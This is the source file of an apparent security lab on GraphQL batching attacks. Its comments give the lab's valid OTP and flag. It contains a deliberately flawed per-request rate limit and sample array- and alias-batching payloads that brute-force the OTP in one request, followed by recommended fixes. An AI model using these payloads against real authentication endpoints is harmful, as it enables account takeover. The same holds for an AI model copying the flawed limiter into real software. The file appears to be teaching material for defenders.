<?php
// ============================================================
// Lab 4: Batching Attack (Source Code)
// ============================================================
// Engine: GraphQL (Simulated)
// Data: /home/kali/SQLi-Arena/data/graphql/lab4.json
// ============================================================

// Valid OTP: "1337" (4-digit numeric code)
// Flag: FLAG{gq_b4tch1ng_4tt4ck}

// Rate limiting middleware:
$requestCount++;  // Incremented per HTTP request
if ($requestCount > $maxPerWindow) {
    return error('Rate limit exceeded. Try again later.');
}

// --- The Vulnerability ---
// Rate limiting counts HTTP requests, NOT GraphQL operations.
// GraphQL supports sending multiple operations in one request:

// Method 1: Array batching (multiple queries in JSON array)
// POST /graphql
// [
//   {"query": "mutation { verifyOtp(otp: \"0001\") { success flag } }"},
//   {"query": "mutation { verifyOtp(otp: \"0002\") { success flag } }"},
//   {"query": "mutation { verifyOtp(otp: \"0003\") { success flag } }"}
// ]
// -> 3 OTP attempts, 1 HTTP request

// Method 2: Alias batching (multiple mutations in one query)
// POST /graphql
// {"query": "mutation {
//   a: verifyOtp(otp: \"0001\") { success flag }
//   b: verifyOtp(otp: \"0002\") { success flag }
//   c: verifyOtp(otp: \"0003\") { success flag }
// }"}
// -> 3 OTP attempts, 1 HTTP request

// With alias batching, you can send 100+ OTP attempts per request.
// 10,000 possible OTPs / 100 per batch = ~100 HTTP requests total.
// With the hint that it is a "leet" number, the search space is tiny.

// --- Secure Version ---
// 1. Rate limit per OPERATION, not per HTTP request:
//    Count each mutation/query individually
// 2. Limit batch size: reject batches with more than N operations
// 3. Limit alias count per query
// 4. Add exponential backoff on failed OTP attempts
// 5. Lock account after N failed attempts
// 6. Use longer OTPs (6-8 digits) to increase brute-force difficulty
?>
